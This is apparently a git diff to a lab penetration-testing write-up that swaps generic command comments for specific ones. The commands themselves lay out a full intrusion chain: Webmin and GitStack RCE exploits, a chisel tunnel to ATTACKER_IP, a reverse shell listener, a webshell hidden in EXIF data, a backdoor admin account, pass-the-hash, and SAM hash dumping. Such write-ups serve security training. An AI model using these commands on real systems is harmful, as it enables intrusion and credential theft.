@@ -69,8 +69,8 @@ Reusable commands were extracted into [nmap](../../../tools/recon/nmap.md), [pro
 
 ```bash
 ping $TARGET -c1
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: full TCP SYN port scan with high speed.
+# Why here: discover all open ports on the initial target quickly.
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent-web-server
 nmap -sVC -p22,80,443,10000 $TARGET -oN service-web-server
 # What it does: adds machine domains to /etc/hosts.
@@ -87,17 +87,17 @@ Full technique: [Webmin 1.890 RCE](../../../exploits/web-rce/webmin-cve-2019-151
 The Webmin service was vulnerable to unauthenticated RCE. The exploit returned a root shell, then the root SSH key was recovered for a stable foothold.
 
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: execute the Webmin 1.890 unauthenticated RCE exploit.
+# Why here: gain initial root access to the first host in the network.
 python3 CVE-2019-15107.py $TARGET
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the root SSH private key.
+# Why here: obtain a persistent and stable foothold on the target.
 cat /root/.ssh/id_rsa
-# What it does: changes permissions or owner.
-# Why here: make a payload executable or control access to a file.
+# What it does: restrict permissions on the SSH key.
+# Why here: satisfy SSH client security requirements for private key usage.
 chmod 600 id_rsa
-# What it does: opens an SSH session or tunnel with the specified options.
-# Why here: obtain interactive shell or pivot to an internal service.
+# What it does: log in as root via SSH using the recovered key.
+# Why here: establish a reliable interactive management session.
 ssh -i id_rsa root@$TARGET
 ```
 
@@ -115,8 +115,8 @@ The first pivot exposed the internal network through a reverse SOCKS tunnel:
 ./chisel client ATTACKER_IP:15000 R:socks &
 
 # Kali through proxychains
-# What it does: configures or uses a pivoting/remote access tool.
-# Why here: reach internal services through the compromised path.
+# What it does: run Nmap through the SOCKS proxy.
+# Why here: discover services on the second host (10.200.180.150) from the internal network.
 proxychains nmap -sT -Pn -n 10.200.180.1-255 -oN scan
 ```
 
@@ -137,13 +137,13 @@ Full technique: [GitStack 2.3.10 RCE](../../../exploits/web-rce/gitstack-rce.md)
 GitStack was reachable on port `80` through the SOCKS pivot and was vulnerable to a public unauthenticated RCE. The exploit uploaded a PHP webshell and command execution was triggered with `curl`.
 
 ```bash
-# What it does: searches for or copies a local Exploit-DB PoC.
-# Why here: relate the detected version to a reusable exploit.
+# What it does: search Exploit-DB for GitStack vulnerabilities.
+# Why here: find a public exploit for the detected web service.
 searchsploit gitstack
 searchsploit -m 43777
 dos2unix 43777.py
-# What it does: configures or uses a pivoting/remote access tool.
-# Why here: reach internal services through the compromised path.
+# What it does: execute the Python exploit through proxychains.
+# Why here: trigger unauthenticated RCE on the internal GitStack server.
 proxychains /usr/bin/python2 43777.py
 proxychains curl -X POST http://10.200.180.150/web/exploit-tryzub.php --data-urlencode "a=whoami"
 ```
@@ -158,8 +158,8 @@ firewall-cmd --zone=public --add-port=4444/tcp
 
 # Kali
 ./chisel client 10.200.180.200:16000 R:4444:127.0.0.1:4444 &
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: set up a netcat listener to catch the relayed shell.
+# Why here: receive the incoming connection from the second host via the Chisel tunnel.
 rlwrap nc -lvnp 4444
 ```
 
@@ -177,11 +177,11 @@ net user tryzub
 ```
 
 ```bash
-# What it does: opens a WinRM shell with the specified credentials/hash.
-# Why here: obtain interactive Windows access after validating credentials.
+# What it does: establish a WinRM session with the newly created admin user.
+# Why here: gain a stable and interactive Windows management shell.
 proxychains evil-winrm -u tryzub -p 'Tryzub@' -i 10.200.180.150
-# What it does: configures or uses a pivoting/remote access tool.
-# Why here: reach internal services through the compromised path.
+# What it does: open an RDP session for GUI-based post-exploitation.
+# Why here: facilitate tool execution and manual enumeration on Windows.
 proxychains xfreerdp /v:10.200.180.150 /u:tryzub /p:'Tryzub@' +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share /cert:ignore /sec:tls
 ```
 
@@ -196,8 +196,8 @@ lsadump::sam
 ```
 
 ```bash
-# What it does: opens a WinRM shell with the specified credentials/hash.
-# Why here: obtain interactive Windows access after validating credentials.
+# What it does: use Evil-WinRM to pass the Administrator NTLM hash.
+# Why here: elevate access to the built-in Administrator account.
 proxychains evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150
 ```
 
@@ -239,27 +239,27 @@ download website.zip
 ```
 
 ```bash
-# What it does: extracts a compressed file to the chosen directory.
-# Why here: inspect source code or recovered files.
+# What it does: decompress the recovered Git repository.
+# Why here: prepare the source code for manual security review.
 unzip website.zip -d ./repos
-# What it does: copies or moves a file.
-# Why here: prepare payloads or place loot where the next command expects it.
+# What it does: rename the directory to .git to use standard git tools.
+# Why here: enable the usage of GitTools for history extraction.
 mv Website.git .git
 git clone https://github.com/internetwache/GitTools
 /home/kali/Desktop/tools/GitTools/Extractor/extractor.sh . Website_extracted
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: find all PHP files in the extracted repository.
+# Why here: identify target files for upload filter logic analysis.
 find . -name "*.php"
 ```
 
 The working payload used a PHP webshell embedded in EXIF `Comment` metadata:
 
 ```bash
-# What it does: copies or moves a file.
-# Why here: prepare payloads or place loot where the next command expects it.
+# What it does: rename the image to include a PHP extension.
+# Why here: test the upload filter's handling of multiple extensions.
 mv image.jpg image.jpeg.php
-# What it does: inspects or extracts hidden content/metadata from a file.
-# Why here: recover clues or credentials hidden in assets.
+# What it does: inject the PHP webshell into the image's EXIF Comment field.
+# Why here: bypass metadata-based file validation while maintaining a valid image structure.
 exiftool -Comment="$(cat /tmp/payload.php)" image.jpeg.php
 ```
 
@@ -274,14 +274,14 @@ Full techniques: [Windows unquoted service path](../../../exploits/privesc-windo
 Manual service enumeration found `SystemExplorerHelpService` with a space-containing unquoted path under a directory writable by `BUILTIN\Users`.
 
 ```cmd
-REM What it does: execute a Windows command-line action.
-REM Why here: enumerate, transfer, replace or validate artifacts on the victim.
+REM What it does: list privileges and groups for the current session.
+REM Why here: determine the level of access and available escalation primitives.
 whoami /priv
 whoami /groups
 wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
 sc qc SystemExplorerHelpService
-REM What it does: execute a PowerShell command on Windows.
-REM Why here: download, execute or enumerate from the Windows foothold.
+REM What it does: check ACLs for the identified unquoted service path.
+REM Why here: verify if the current user has write permissions to plant a binary.
 powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
 ```
 
@@ -292,8 +292,8 @@ mcs Wrapper.cs
 ```
 
 ```cmd
-REM What it does: execute a Windows command-line action.
-REM Why here: enumerate, transfer, replace or validate artifacts on the victim.
+REM What it does: stop and start the vulnerable service.
+REM Why here: trigger the execution of the planted binary in the unquoted path.
 sc stop SystemExplorerHelpService
 sc start SystemExplorerHelpService
 ```
@@ -306,8 +306,8 @@ reg.exe save HKLM\SYSTEM system.bak
 ```
 
 ```bash
-# What it does: executes an Impacket utility for AD/Windows.
-# Why here: extract tickets, hashes or protocol access for the chain.
+# What it does: parse the SAM and SYSTEM hive backups.
+# Why here: extract local account hashes for offline cracking or pass-the-hash.
 impacket-secretsdump -sam sam.bak -system system.bak LOCAL
 ```
 
